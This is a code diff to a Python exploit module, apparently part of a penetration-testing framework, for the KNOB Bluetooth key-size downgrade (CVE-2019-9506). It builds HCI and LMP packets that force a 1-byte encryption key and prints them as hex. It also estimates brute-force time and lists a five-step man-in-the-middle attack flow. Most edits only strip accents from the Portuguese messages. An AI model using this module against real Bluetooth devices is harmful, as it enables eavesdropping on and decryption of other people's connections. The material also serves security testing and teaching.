@@ -118,44 +118,49 @@ class Exploit(Exploit):
         if not self._validate():
             return
 
+        print_success("Validation passed; launching exploit ...")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: KNOB entropy downgrade via LMP key size manipulation."""
         addr_bytes = _parse_bd_addr(str(self.target))
         key_size = int(self.target_key_size)
 
-        print_status("Gerando sequência de manipulação LMP...")
+        print_status("Gerando sequencia de manipulacao LMP...")
         steps = [
             ("HCI Create Connection", _build_hci_create_connection(addr_bytes)),
             ("HCI Authentication Requested", _build_hci_auth_requested(0x0001)),
             ("LMP Key Size Req (original interceptado)", _build_lmp_key_size_req(0, _DEFAULT_KEY_SIZE)),
             ("LMP Key Size Req (modificado para min)", _build_lmp_key_size_req(0, key_size)),
-            ("LMP Key Size Resp (vítima aceita min)", _build_lmp_key_size_req(1, key_size)),
+            ("LMP Key Size Resp (vitima aceita min)", _build_lmp_key_size_req(1, key_size)),
             ("HCI Set Connection Encryption", _build_hci_set_conn_encryption(0x0001, True)),
         ]
 
-        headers = ["Passo", "Descrição", "Tam.", "PDU (hex)"]
+        headers = ["Passo", "Descricao", "Tam.", "PDU (hex)"]
         rows = [(str(i + 1), desc, str(len(pdu)), pdu.hex()) for i, (desc, pdu) in enumerate(steps)]
         print_table(headers, *rows)
 
         brute_force_space = 256 ** key_size
         brute_time_ns = brute_force_space / 1_000_000_000
-        print_info("Análise de força bruta:")
-        print_info(f"  Espaço de chaves: {brute_force_space:,} possibilidades")
+        print_info("Analise de forca bruta:")
+        print_info(f"  Espaco de chaves: {brute_force_space:,} possibilidades")
         print_info(f"  Tempo estimado (1 GHz): {brute_time_ns:.4f} segundos")
 
         if key_size == 1:
-            print_success("1 byte: trivialmente quebrável (256 tentativas)")
+            print_success("1 byte: trivialmente quebravel (256 tentativas)")
         elif key_size <= 4:
-            print_warning(f"{key_size} bytes: quebrável em tempo razoável")
+            print_warning(f"{key_size} bytes: quebravel em tempo razoavel")
         else:
             print_info(f"{key_size} bytes: chave fraca mas resistente")
 
         print_info("")
         print_info("Fluxo de ataque real:")
         print_info(f"  1. Posicionar adaptador '{self.interface}' em modo MitM entre os dois dispositivos")
-        print_info("  2. Interceptar troca LMP durante pareamento/reconexão")
+        print_info("  2. Interceptar troca LMP durante pareamento/reconexao")
         print_info(f"  3. Modificar LMP_encryption_key_size_req de {_DEFAULT_KEY_SIZE} para {key_size} byte(s)")
-        print_info("  4. Ambos aceitam chave mínima — criptografia comprometida")
+        print_info("  4. Ambos aceitam chave minima: criptografia comprometida")
         print_info("  5. Brute-force offline da chave de 1 byte")
         print_info("")
-        print_warning("CVE-2019-9506: CVSS 8.1 — afeta TODOS os dispositivos BR/EDR não corrigidos")
-        print_info("Ferramenta: InternalBlue, BTLE-Sniffer + modificação de firmware HCI")
-        print_info("Mitigação: patch que exige key_size >= 7 no LMP (Android, iOS, Linux já corrigidos)")
+        print_warning("CVE-2019-9506: CVSS 8.1: afeta TODOS os dispositivos BR/EDR nao corrigidos")
+        print_info("Ferramenta: InternalBlue, BTLE-Sniffer + modificacao de firmware HCI")
+        print_info("Mitigacao: patch que exige key_size >= 7 no LMP (Android, iOS, Linux ja corrigidos)")
